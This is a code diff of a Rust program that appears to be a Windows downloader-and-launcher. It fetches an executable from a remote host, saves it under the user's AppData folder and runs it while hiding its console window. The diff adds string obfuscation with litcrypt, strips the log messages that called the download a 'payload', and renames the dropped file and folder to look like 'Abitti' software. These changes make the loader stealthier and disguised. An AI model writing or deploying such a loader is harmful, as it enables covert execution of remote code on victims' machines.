@@ -2,29 +2,29 @@
     all(not(debug_assertions), target_os = "windows"),
     windows_subsystem = "windows"
 )]
+#[macro_use]
+extern crate litcrypt;
+
+use_litcrypt!();
+
 use std::fs;
 
 #[tokio::main]
 async fn main() {
-    println!("Fetching payload...");
-    let download_url = "http://github.com/ctih1/kake/releases/latest/download/client.exe";
+    let download_url = lc!("https://homecdn.frii.site/kake/client.exe");
 
-    let resp = reqwest::get(download_url).await.expect("failed to download client");
-    let body = resp.bytes().await.expect("Invalid client data");
+    let resp = reqwest::get(download_url).await.expect(&lc!("failed to download client"));
+    let body = resp.bytes().await.expect(&lc!("Invalid client data"));
 
-    let username = std::env::var("USERNAME").unwrap();
+    let username = std::env::var(&lc!("USERNAME")).unwrap();
 
-    println!("Saving payload");
-    let base_path = format!("C:\\Users\\{username}\\AppData\\Local\\mun-gradia");
+    let base_path = lc!("C:\\Users\\") + &username + &lc!("\\AppData\\Local\\Abitti2");
     if let Err(e) = fs::create_dir_all(&base_path) {
-        println!("Failed to create dirs. {e}");
     }
 
-    let path = format!("{base_path}\\client.exe");
+    let path = base_path + &lc!("\\abitti_wumgr.exe");
     if let Err(e) = fs::write(&path, body) {
-        println!("failed to write payload: {}", e);
     }
 
-    println!("Running client");
     let _ = std::process::Command::new(path).spawn();
 }
